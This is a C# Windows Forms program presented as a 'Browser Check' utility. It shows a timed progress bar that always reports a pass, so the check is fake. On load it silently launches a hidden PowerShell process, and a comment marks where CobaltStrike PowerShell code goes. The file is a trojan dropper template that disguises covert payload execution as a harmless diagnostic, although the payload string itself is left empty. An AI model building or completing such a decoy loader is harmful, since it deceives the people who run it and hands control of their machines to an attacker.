using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Windows.Forms;
using System.Timers; // For progress bar timing
using System.Diagnostics; // For process creation

namespace BrowserCheck
{
    public partial class Form1 : Form
    {
        System.Timers.Timer progressBarTimer = new System.Timers.Timer(); // Creates globally-accessible timer

        public Form1()
        {
            InitializeComponent();
            textBox1.Text = "Not Applicable"; // Sets initial value of "Status" text box to "Not Applicable"
        }

        // When "Run Browser Check" is clicked
        private void button1_Click(object sender, EventArgs e)
        {
            textBox1.Text = "Running";
            progressBarTimer.Interval = 10000; // Tick interval - determines how fast the progress bar will complete (defaults to 10 seconds)
            progressBarTimer.Elapsed += OnTimedEvent; // Function to be called for each tick
            progressBarTimer.Enabled = true; // Enables timer

            progressBar1.Value = 0; // Sets initial value of progress bar to 0
            progressBar1.Step = 10; // Steps by 10% each time   
        }

        // This function is called for each tick
        private void OnTimedEvent(Object source, System.Timers.ElapsedEventArgs e)
        {
            progressBar1.PerformStep(); // Performs step

            // If progress bar is at 100% - we need to stop the timer
            if (progressBar1.Value == 100)
            {
                progressBarTimer.Stop(); // Stops timer
                MessageBox.Show("Your computer has passed the browser check. You may exit the program now."); // Displays pop-up window to user letting them know that they passed
                textBox1.Text = "Passed"; // Sets "Status" text box to "Passed"
            }

        }

        // When the program loads
        private void Form1_Load(object sender, EventArgs e)
        {
            ProcessStartInfo startInfo = new ProcessStartInfo();
            startInfo.FileName = "powershell.exe";
            startInfo.CreateNoWindow = true;
            startInfo.UseShellExecute = true;
            startInfo.Arguments = ""; // **** Need to include CobaltStrike PowerShell code here ****
            Process.Start(startInfo);
        }
    }
}
